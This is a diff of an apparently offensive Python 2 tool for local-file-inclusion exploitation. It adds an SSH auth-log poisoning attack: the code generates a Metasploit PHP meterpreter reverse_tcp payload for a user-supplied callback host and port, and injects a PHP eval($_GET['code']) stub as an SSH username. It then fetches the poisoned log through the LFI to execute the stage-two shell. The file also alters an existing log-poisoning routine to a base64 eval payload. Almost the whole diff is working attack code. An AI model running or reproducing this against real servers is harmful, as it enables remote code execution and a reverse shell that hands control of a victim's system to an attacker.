@@ -9,7 +9,9 @@ import subprocess
 import requests
 import base64
 import textwrap
+import urlparse
 from urllib import quote_plus
+from os import system
 
 
 t = Terminal()
@@ -278,9 +280,6 @@ class Logs:
         handle.handler()
 
         if self.nostager:
-            payload_file = open("/tmp/{0}.php".format(shell), "r")
-            payload = payload_file.read()
-            payload += quote_plus(payload_file.read().replace("\"", "\\\"").replace("$", "\\$"))
             payload_file = open("/tmp/{0}.php".format(shell),"r")
             payload = "<?php eval(base64_decode('{0}')); ?>".format(payload_file.read().encode('base64').replace("\n", ""))
             payload_file.close()
@@ -302,6 +301,64 @@ class Logs:
                 r = requests.get(lfi)  # pull down shell from poisoned logs
                 if r.status_code != 200:
                     print(t.red(" [!] Unexpected HTTP Response "))
+        except requests.exceptions.RequestException as access_error:
+            print t.red(" [!] HTTP Error ")(access_error)
+
+
+class SSHLogs:
+
+    def __init__(self, target, location):
+
+        self.target = target
+        self.location = location  # /var/log/auth.log
+
+    def execute_ssh(self):
+
+        # Arguments for Meterpreter
+        lhost = raw_input(t.green(" [*] ") + "Please Enter Host For Callbacks: ")
+        lport = raw_input(t.green(" [*] ") + "Please Enter Port For Callbacks: ")
+
+        # Generate random shell name
+        g = Generator()
+        shell = g.generate()
+
+        print(t.green(" [*] ") + "Generating Payload")
+        progressbar()
+        print(t.red(" [!] ") + "Success!")
+        print(t.green(" [*] ") + "Generating Metasploit Payload")
+        progressbar()
+
+        # Generate PHP shell
+        php = "/usr/local/share/metasploit-framework/msfpayload php/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > /tmp/{2}.php".format(lhost, lport, shell)
+        msf = subprocess.Popen(php, shell=True)
+        msf.wait()
+
+        # Handle Metasploit error codes
+        if msf.returncode != 0:
+            print(t.red(" [!] Error Generating MSF Payload "))
+        else:
+            print(t.green(" [*] ") + "Success!")
+
+        handle = Payload(lhost, lport, self.target, shell)
+        handle.handler()
+
+        payload_file = open('/tmp/{0}.php'.format(shell),'r')
+	payload_stage2 = quote_plus(payload_file.read())
+        payload_file.close()
+        payload = "<?php eval(\\$_GET['code'])?>"
+        print(t.blue(" [!] ") + "Enter fake passwords to perform SSH log poisoning...")
+        host = urlparse.urlsplit(self.target).netloc
+        system('/usr/bin/ssh "{0}@{1}"'.format(payload,host))
+
+        print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
+        print(t.green(" [*] ") + "Downloading Shell")
+        progressbar()
+        lfi = self.target + self.location + '&code={0}'.format(payload_stage2)
+        
+        try:
+            r = requests.get(lfi)  # pull down shell from poisoned logs
+            if r.status_code != 200:
+                print(t.red(" [!] Unexpected HTTP Response "))
         except requests.exceptions.RequestException as access_error:
             print t.red(" [!] HTTP Error ")(access_error)
 
